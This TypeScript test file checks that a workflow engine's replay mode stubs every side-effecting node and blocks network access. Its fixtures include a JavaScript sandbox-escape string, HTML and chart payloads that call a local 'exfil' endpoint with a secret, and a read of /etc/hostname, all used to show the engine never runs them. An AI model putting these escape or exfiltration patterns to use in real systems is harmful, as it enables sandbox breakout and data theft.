/**
 * Phase 15.1 — replay safety in the engine. With a replay plan's hook, no
 * node that can touch the outside world runs its handler: every external
 * read and write, approval, wait, sub-workflow and unknown node type is
 * answered from the recording (or a stub), at the top level, inside loops
 * and for disconnected-from-recording nodes alike. Global `fetch` is
 * replaced by a trap for every test, so a handler that slipped through
 * would be caught.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { DefaultAgentRuntime } from "@ai-orchestrator/agent-runtime";
import { createDefaultConnectorRegistry } from "@ai-orchestrator/connector-sdk";
import { MCPRegistry } from "@ai-orchestrator/mcp-sdk";
import { ProviderRegistry } from "@ai-orchestrator/provider-sdk";
import {
  getNodeDefinition,
  nodeDefinitions,
  REPLAY_ALWAYS_STUBBED_CLASSES,
  REPLAY_BLOCKED_LOAD_MARKER,
  REPLAY_STUB_MARKER,
  replayNodeClass,
  type ReplayRecordedNode,
  type Workflow,
  type WorkflowNode
} from "@ai-orchestrator/shared";
import { executeWorkflow, type WorkflowExecutionDependencies } from "./executor";
import { buildReplayPlan } from "./replay-plan";

let fetchCalls: string[] = [];
const realFetch = globalThis.fetch;

beforeEach(() => {
  fetchCalls = [];
  globalThis.fetch = vi.fn(async (input: unknown) => {
    fetchCalls.push(String(input instanceof Request ? input.url : input));
    throw new Error("network is not allowed in a replay test");
  }) as unknown as typeof fetch;
});

afterEach(() => {
  globalThis.fetch = realFetch;
});

function deps(extra: Partial<WorkflowExecutionDependencies> = {}): WorkflowExecutionDependencies {
  return {
    providerRegistry: new ProviderRegistry(),
    mcpRegistry: new MCPRegistry(),
    connectorRegistry: createDefaultConnectorRegistry(),
    agentRuntime: new DefaultAgentRuntime(),
    resolveSecret: async () => "resolved-secret-value",
    ...extra
  };
}

function node(id: string, type: string, config: Record<string, unknown> = {}): WorkflowNode {
  return { id, type, name: id, position: { x: 0, y: 0 }, config } as WorkflowNode;
}

/** The nodes in a line, ending in an Output node (`out`). */
function chain(input: WorkflowNode[], extraEdges: Workflow["edges"] = []): Workflow {
  const nodes = [...input, node("out", "output", { responseTemplate: "done" })];
  const edges = nodes.slice(1).map((entry, index) => ({ id: `e${index}`, source: nodes[index]!.id, target: entry.id }));
  return { id: "wf-replay", name: "Replay", schemaVersion: "1.0.0", workflowVersion: 1, nodes, edges: [...edges, ...extraEdges] } as Workflow;
}

function recorded(entries: Array<Partial<ReplayRecordedNode> & { nodeId: string; nodeType: string }>): Record<string, ReplayRecordedNode> {
  return Object.fromEntries(entries.map((entry) => [entry.nodeId, { status: "success", ...entry } as ReplayRecordedNode]));
}

const resultOf = (result: Awaited<ReturnType<typeof executeWorkflow>>, nodeId: string) => result.nodeResults.filter((entry) => entry.nodeId === nodeId);

describe("every side-effect class is stubbed", () => {
  const stubbedTypes = nodeDefinitions
    .map((definition) => definition.type)
    .filter((type) => REPLAY_ALWAYS_STUBBED_CLASSES.has(replayNodeClass({ type })) && replayNodeClass({ type }) !== "wait");

  it("covers connectors, approvals and sub-workflows", () => {
    for (const type of ["slack_send_message", "smtp_send_email", "http_request", "postgres_query", "redis_command", "mongo_operation", "aws_s3_put_object", "stripe_create_charge", "execute_workflow", "human_approval", "rag_retrieve", "qdrant_vector_store"]) {
      expect(stubbedTypes).toContain(type);
    }
  });

  it.each(stubbedTypes)("%s replays its recorded output and never runs", async (type) => {
    const sentinel = { sentinel: `recorded-${type}` };
    // The sample configuration passes validation; the node must still never run.
    const config = { ...(getNodeDefinition(type)?.sampleConfig ?? {}), urlTemplate: "https://example.invalid/hook", method: "POST", workflowId: "wf-child", endpoint: "https://example.invalid", deployment: "embed", secretRef: { secretId: "sec_test" } };
    const workflow = chain([node("start", "manual_trigger"), node("x", type, config)]);
    const plan = buildReplayPlan(workflow, recorded([{ nodeId: "x", nodeType: type, output: sentinel }]));
    const loadWorkflow = vi.fn();
    const persistPausedExecution = vi.fn();
    const resolveSecret = vi.fn(async () => "resolved-secret-value");
    const result = await executeWorkflow({ workflow, executionId: "exec-1" }, deps({ replayNodeHook: plan.hook, loadWorkflow, persistPausedExecution, resolveSecret }));
    expect(result.error ?? "").toBe("");
    expect(result.status).toBe("success");
    expect(resultOf(result, "x").map((entry) => entry.output)).toEqual([sentinel]);
    expect(fetchCalls).toEqual([]);
    expect(loadWorkflow).not.toHaveBeenCalled();
    expect(persistPausedExecution).not.toHaveBeenCalled();
    // A handler that ran would have resolved its credential first.
    expect(resolveSecret).not.toHaveBeenCalled();
    expect(plan.hits).toEqual([expect.objectContaining({ nodeId: "x", stub: "output", recorded: true })]);
  });
});

describe("replay plan", () => {
  it("stubs a side effect the recording never saw, with a marker and a warning", async () => {
    const workflow = chain([node("start", "manual_trigger"), node("slack", "slack_send_message", { channel: "#ops", text: "hi" })]);
    const plan = buildReplayPlan(workflow, {});
    expect(plan.decisions).toEqual([
      { nodeId: "start", nodeType: "manual_trigger", nodeClass: "trigger", action: "run" },
      { nodeId: "slack", nodeType: "slack_send_message", nodeClass: "write", action: "unrecorded_stub" },
      { nodeId: "out", nodeType: "output", nodeClass: "logic", action: "run" }
    ]);
    expect(plan.warnings).toEqual([expect.objectContaining({ kind: "unrecorded_stub", nodeId: "slack" })]);
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(result.status).toBe("success");
    expect(resultOf(result, "slack")[0]!.output).toEqual({ [REPLAY_STUB_MARKER]: "unrecorded", nodeId: "slack", nodeType: "slack_send_message" });
    expect(fetchCalls).toEqual([]);
  });

  it("does not reuse a recorded output for a node whose type changed", async () => {
    const workflow = chain([node("start", "manual_trigger"), node("x", "smtp_send_email", { to: "a@example.com" })]);
    const plan = buildReplayPlan(workflow, recorded([{ nodeId: "x", nodeType: "http_request", output: { status: 200 } }]));
    expect(plan.decisions[1]!.action).toBe("unrecorded_stub");
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect((resultOf(result, "x")[0]!.output as Record<string, unknown>)[REPLAY_STUB_MARKER]).toBe("unrecorded");
  });

  it("replays a recorded failure without retrying or running the node", async () => {
    const workflow = chain([node("start", "manual_trigger"), node("http", "http_request", { urlTemplate: "https://example.invalid", method: "POST", retry: { enabled: true, maxAttempts: 5, delayMs: 2000 } })]);
    const plan = buildReplayPlan(workflow, recorded([{ nodeId: "http", nodeType: "http_request", status: "error", error: "HTTP 503 from upstream" }]));
    const started = Date.now();
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(Date.now() - started).toBeLessThan(1500);
    expect(result.status).toBe("error");
    expect(resultOf(result, "http")[0]).toMatchObject({ status: "error" });
    expect(resultOf(result, "http")[0]!.error).toContain("HTTP 503 from upstream");
    expect(fetchCalls).toEqual([]);
  });

  it("stubs a side effect inside a loop body on every iteration", async () => {
    const workflow = chain([
      node("start", "manual_trigger"),
      node("items", "code_node", { code: "return { list: ['a', 'b', 'c'] };" }),
      node("loop", "loop_node", { inputKey: "list", itemVariable: "item" }),
      node("slack", "slack_send_message", { channel: "#ops", text: "{{item}}" })
    ]);
    const plan = buildReplayPlan(workflow, recorded([
      { nodeId: "items", nodeType: "code_node", output: { list: ["a", "b", "c"] } },
      { nodeId: "slack", nodeType: "slack_send_message", output: { ok: true, ts: "1" } }
    ]));
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(fetchCalls).toEqual([]);
    const slackRuns = resultOf(result, "slack");
    expect(slackRuns.length).toBeGreaterThanOrEqual(1);
    for (const run of slackRuns) expect(run.output).toEqual({ ok: true, ts: "1" });
    expect(plan.hits.filter((hit) => hit.nodeId === "slack").length).toBe(slackRuns.length);
    expect(slackRuns.length).toBe(3);
  });

  it("never starts a sub-workflow, sync or async", async () => {
    const loadWorkflow = vi.fn(() => chain([node("child-start", "manual_trigger"), node("child-slack", "slack_send_message", {})]));
    for (const mode of ["sync", "async"]) {
      const workflow = chain([node("start", "manual_trigger"), node("sub", "execute_workflow", { workflowId: "wf-child", mode })]);
      const plan = buildReplayPlan(workflow, {});
      const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook, loadWorkflow }));
      expect(result.status).toBe("success");
    }
    expect(loadWorkflow).not.toHaveBeenCalled();
    expect(fetchCalls).toEqual([]);
  });

  it("stubs an unknown node type instead of running it", async () => {
    const workflow = chain([node("start", "manual_trigger"), node("fax", "community_send_fax", { number: "+1555" })]);
    const plan = buildReplayPlan(workflow, recorded([{ nodeId: "fax", nodeType: "community_send_fax", output: { sent: true } }]));
    expect(plan.decisions[1]).toMatchObject({ nodeClass: "write", action: "recorded" });
    expect(plan.warnings).toEqual([expect.objectContaining({ kind: "unknown_node_type", nodeId: "fax" })]);
    expect(plan.hook(node("fax", "community_send_fax"))).toEqual({ kind: "output", output: { sent: true } });
    expect(plan.hook(node("other", "community_post_tweet"))).toMatchObject({ kind: "output", output: { [REPLAY_STUB_MARKER]: "unrecorded" } });
    // The engine refuses to start a workflow with a type it does not know; either way nothing runs.
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(result.nodeResults.filter((entry) => entry.nodeId === "fax" && entry.status === "success").every((entry) => JSON.stringify(entry.output) === JSON.stringify({ sent: true }))).toBe(true);
    expect(fetchCalls).toEqual([]);
  });

  it("passes a wait straight through", async () => {
    const workflow = chain([node("start", "manual_trigger"), node("wait", "wait_node", { delayMs: 25_000, maxDelayMs: 30_000 })]);
    const plan = buildReplayPlan(workflow, {});
    expect(plan.decisions[1]!.action).toBe("pass_through");
    const started = Date.now();
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(Date.now() - started).toBeLessThan(2000);
    expect(result.status).toBe("success");
  });

  it("replays a recorded approval instead of pausing for a person", async () => {
    const workflow = chain([node("start", "manual_trigger"), node("approve", "human_approval", { approvalMessage: "ok?", timeoutMinutes: 5 }), node("after", "noop_node")]);
    const plan = buildReplayPlan(workflow, recorded([{ nodeId: "approve", nodeType: "human_approval", output: { approved: true, decision: "approve" } }]));
    const persistPausedExecution = vi.fn();
    const result = await executeWorkflow({ workflow, executionId: "exec-approval" }, deps({ replayNodeHook: plan.hook, persistPausedExecution }));
    expect(result.status).toBe("success");
    expect(persistPausedExecution).not.toHaveBeenCalled();
    expect(resultOf(result, "approve")[0]!.output).toEqual({ approved: true, decision: "approve" });
  });

  it("answers JavaScript and Python code nodes from the recording and never runs them", async () => {
    // Both scripts are stubbed from the recording and never run; the JavaScript sandbox would block the escape even if it did run.
    const escape = "const p = this.constructor.constructor('return process')(); p.getBuiltinModule('node:http').get('http://127.0.0.1:9/escape'); return { doubled: 42 };";
    const js = node("js", "code_node", { language: "javascript", code: escape });
    const py = node("py", "code_node", { language: "python", code: "import urllib.request\nresult = 1" });
    const workflow = chain([node("start", "manual_trigger"), js, py]);
    const plan = buildReplayPlan(workflow, recorded([
      { nodeId: "js", nodeType: "code_node", output: { doubled: 0 } },
      { nodeId: "py", nodeType: "code_node", output: { code_result: "recorded" } }
    ]));
    expect(plan.decisions.map((decision) => [decision.nodeClass, decision.action])).toEqual([["trigger", "run"], ["code", "recorded"], ["code", "recorded"], ["logic", "run"]]);
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(resultOf(result, "js")[0]!.output).toEqual({ doubled: 0 });
    expect(resultOf(result, "py")[0]!.output).toEqual({ code_result: "recorded" });
    expect(plan.hits.map((hit) => hit.nodeId)).toEqual(["js", "py"]);
    expect(fetchCalls).toEqual([]);
  });

  it("stubs a code node the recording never saw instead of running it", async () => {
    const workflow = chain([node("start", "manual_trigger"), node("added", "code_node", { code: "return { ran: true };" })]);
    const plan = buildReplayPlan(workflow, {});
    expect(plan.warnings).toEqual([expect.objectContaining({ kind: "unrecorded_stub", nodeId: "added" })]);
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(resultOf(result, "added")[0]!.output).toMatchObject({ [REPLAY_STUB_MARKER]: "unrecorded" });
  });

  it("never renders an HTML PDF in a replay: the recorded PDF is used", async () => {
    const pdf = node("pdf", "pdf_output", { renderMode: "html", htmlTemplate: "<img src='http://127.0.0.1:9/exfil'>" });
    const workflow = chain([node("start", "manual_trigger"), pdf]);
    const plan = buildReplayPlan(workflow, recorded([{ nodeId: "pdf", nodeType: "pdf_output", output: { result: "data:application/pdf;base64,recorded" } }]));
    expect(plan.decisions[1]).toMatchObject({ nodeClass: "read", action: "recorded" });
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(resultOf(result, "pdf")[0]!.output).toEqual({ result: "data:application/pdf;base64,recorded" });
  });

  it("renders a chart from inline data in a replay but never loads chart data from a URL or file", async () => {
    const inline = node("inline", "chart", { spec: { mark: "bar", data: { values: [{ a: "x", b: 1 }] }, encoding: { x: { field: "a", type: "nominal" }, y: { field: "b", type: "quantitative" } } } });
    const remote = node("remote", "chart", { spec: { mark: "bar", data: { url: "http://127.0.0.1:9/exfil?secret=abc" }, encoding: { x: { field: "a", type: "nominal" } } } });
    const local = node("local", "chart", { spec: { mark: "bar", data: { url: "file:///etc/hostname" }, encoding: { x: { field: "a", type: "nominal" } } } });
    for (const chart of [remote, local]) {
      const workflow = chain([node("start", "manual_trigger"), inline, chart]);
      const plan = buildReplayPlan(workflow, {});
      expect(plan.decisions.find((decision) => decision.nodeId === chart.id)).toMatchObject({ nodeClass: "logic", action: "run" });
      const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
      expect(resultOf(result, "inline")[0]!.status).toBe("success");
      expect(String((resultOf(result, "inline")[0]!.output as Record<string, unknown>).svg)).toContain("<svg");
      const failed = resultOf(result, chart.id)[0]!;
      expect(failed.status).toBe("error");
      expect(failed.error).toContain(REPLAY_BLOCKED_LOAD_MARKER);
    }
    expect(fetchCalls).toEqual([]);
  });

  it("replays a trigger's recorded output, and runs an unrecorded trigger", async () => {
    const workflow = chain([node("hook", "webhook_input", { path: "x" }), node("set", "set_node", { assignments: [{ key: "seen", valueTemplate: "{{message}}" }] })]);
    const withTrigger = buildReplayPlan(workflow, recorded([{ nodeId: "hook", nodeType: "webhook_input", output: { message: "recorded input" } }]));
    expect(withTrigger.decisions[0]!.action).toBe("recorded");
    const result = await executeWorkflow({ workflow, webhookPayload: { message: "live input" } }, deps({ replayNodeHook: withTrigger.hook }));
    expect(resultOf(result, "hook")[0]!.output).toEqual({ message: "recorded input" });
    const without = buildReplayPlan(workflow, {});
    expect(without.decisions[0]!.action).toBe("run");
  });

  it("leaves disabled nodes and sticky notes to the engine", async () => {
    const disabled = { ...node("slack", "slack_send_message", {}), disabled: true } as WorkflowNode;
    const workflow = chain([node("start", "manual_trigger"), disabled]);
    const plan = buildReplayPlan(workflow, {});
    expect(plan.warnings).toEqual([]);
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(result.status).toBe("success");
    expect(plan.hits).toEqual([]);
    expect(fetchCalls).toEqual([]);
  });

  it("does not stub model, MCP or logic nodes", () => {
    const workflow = chain([node("start", "manual_trigger"), node("llm", "llm_call"), node("tool", "mcp_tool"), node("mem", "local_memory"), node("set", "noop_node")]);
    const plan = buildReplayPlan(workflow, recorded([{ nodeId: "llm", nodeType: "llm_call", output: { answer: "x" } }]));
    expect(plan.decisions.map((decision) => decision.action)).toEqual(["run", "run", "cassette", "run", "run", "run"]);
    expect(plan.hook(node("llm", "llm_call"))).toBeNull();
    expect(plan.hook(node("tool", "mcp_tool"))).toBeNull();
  });
});

describe("live read nodes (Phase 15.3)", () => {
  it("runs a named read live and keeps stubbing writes, code and approvals named with it", () => {
    const workflow = chain([
      node("start", "manual_trigger"),
      node("sheet", "google_sheets_read"),
      node("slack", "slack_send_message"),
      node("code", "code_node", { code: "return 1;" }),
      node("approve", "human_approval")
    ]);
    const rec = recorded([
      { nodeId: "sheet", nodeType: "google_sheets_read", output: { rows: [] } },
      { nodeId: "slack", nodeType: "slack_send_message", output: { ok: true } },
      { nodeId: "code", nodeType: "code_node", output: { result: 1 } },
      { nodeId: "approve", nodeType: "human_approval", output: { decision: "approve" } }
    ]);
    const plan = buildReplayPlan(workflow, rec, { liveNodes: new Set(["sheet", "slack", "code", "approve"]) });
    expect(plan.decisions.find((decision) => decision.nodeId === "sheet")?.action).toBe("live");
    expect(plan.hook(node("sheet", "google_sheets_read"))).toBeNull();
    for (const id of ["slack", "code", "approve"]) expect(plan.decisions.find((decision) => decision.nodeId === id)?.action).toBe("recorded");
    expect(plan.hook(node("slack", "slack_send_message"))).toEqual({ kind: "output", output: { ok: true } });
  });

  it("keeps triggers, browser nodes and non-GET HTTP stubbed even when named, and runs a GET request live", () => {
    const nodes = [
      node("redis", "redis_trigger", { key: "jobs" }),
      node("pg", "postgres_trigger", { query: "UPDATE jobs SET picked = true RETURNING *" }),
      node("browse", "web_browse", { urlTemplate: "https://example.com" }),
      node("pdf", "pdf_output", { renderMode: "html" }),
      node("source", "connector_source"),
      node("post", "http_request", { method: "POST", urlTemplate: "https://example.com" }),
      node("get", "http_request", { method: "GET", urlTemplate: "https://example.com" })
    ];
    const workflow = chain([node("start", "manual_trigger"), ...nodes]);
    const rec = recorded(nodes.map((entry) => ({ nodeId: entry.id, nodeType: entry.type, output: { recorded: entry.id } })));
    const plan = buildReplayPlan(workflow, rec, { liveNodes: new Set(nodes.map((entry) => entry.id)) });
    for (const entry of nodes.filter((candidate) => candidate.id !== "get")) {
      expect(plan.decisions.find((decision) => decision.nodeId === entry.id)?.action, entry.id).not.toBe("live");
      expect(plan.hook(entry), entry.id).toEqual({ kind: "output", output: { recorded: entry.id } });
    }
    expect(plan.decisions.find((decision) => decision.nodeId === "get")?.action).toBe("live");
    expect(plan.hook(node("get", "http_request", { method: "GET", urlTemplate: "https://example.com" }))).toBeNull();
  });
});

describe("recorded stubs that no longer match the candidate", () => {
  const loopWorkflow = (code: string) =>
    chain([
      node("start", "manual_trigger"),
      node("items", "code_node", { code: "return { list: ['a', 'b', 'c'] };" }),
      node("loop", "loop_node", { inputKey: "list", itemVariable: "item" }),
      node("shout", "code_node", { language: "javascript", code })
    ]);

  const items = { nodeId: "items", nodeType: "code_node", output: { list: ["a", "b", "c"] } };

  it("flags a code node whose code changed since the golden run, and still never runs it", async () => {
    const before = node("js", "code_node", { language: "javascript", code: "return { n: 1 };" });
    const after = node("js", "code_node", { language: "javascript", code: "return { n: 2 };" });
    const slackBefore = node("slack", "slack_send_message", { channel: "#ops", text: "hi" });
    const slackAfter = node("slack", "slack_send_message", { channel: "#ops", text: "hello" });
    const rec = recorded([{ nodeId: "js", nodeType: "code_node", output: { n: 1 } }, { nodeId: "slack", nodeType: "slack_send_message", output: { ok: true } }]);
    const recordedWorkflow = chain([node("start", "manual_trigger"), before, slackBefore]);

    const same = buildReplayPlan(recordedWorkflow, rec, { recordedWorkflow });
    expect(same.warnings).toEqual([]);

    const workflow = chain([node("start", "manual_trigger"), after, slackAfter]);
    const plan = buildReplayPlan(workflow, rec, { recordedWorkflow });
    expect(plan.warnings).toEqual([
      expect.objectContaining({ kind: "config_changed", nodeId: "js", nodeClass: "code", message: expect.stringContaining("code changed since the golden run; code nodes are not executed in replay") }),
      expect.objectContaining({ kind: "config_changed", nodeId: "slack", nodeClass: "write" })
    ]);
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(resultOf(result, "js")[0]!.output).toEqual({ n: 1 });
    expect(plan.hits.find((hit) => hit.nodeId === "js")).toMatchObject({ recorded: true, configChanged: true });

    // A different language is a code change too; a config normaliser applied on both sides is honoured.
    const python = buildReplayPlan(chain([node("start", "manual_trigger"), node("js", "code_node", { language: "python", code: "return { n: 1 };" })]), rec, { recordedWorkflow });
    expect(python.warnings.map((warning) => warning.nodeId)).toContain("js");
    const normalised = buildReplayPlan(workflow, rec, { recordedWorkflow, normaliseConfig: () => ({}) });
    expect(normalised.warnings).toEqual([]);
  });

  it("replays a code node inside a loop iteration by iteration when the recording has every iteration", async () => {
    const workflow = loopWorkflow("return { up: item.toUpperCase() };");
    const runs = ["A", "B", "C"].map((up) => ({ status: "success", output: { up } }));
    const plan = buildReplayPlan(workflow, recorded([items, { nodeId: "shout", nodeType: "code_node", output: { up: "C" }, runs }]), { recordedWorkflow: workflow });
    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(resultOf(result, "shout").map((entry) => entry.output)).toEqual([{ up: "A" }, { up: "B" }, { up: "C" }]);
    expect(plan.hits.filter((hit) => hit.nodeId === "shout").map((hit) => hit.overrun)).toEqual([false, false, false]);
  });

  it("marks a hit past the recorded iterations instead of silently reusing the last one", async () => {
    const workflow = loopWorkflow("return { up: item.toUpperCase() };");
    const plan = buildReplayPlan(workflow, recorded([items, { nodeId: "shout", nodeType: "code_node", output: { up: "C" } }]));
    await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
    expect(plan.hits.filter((hit) => hit.nodeId === "shout").map((hit) => hit.overrun)).toEqual([false, true, true]);
  });
});
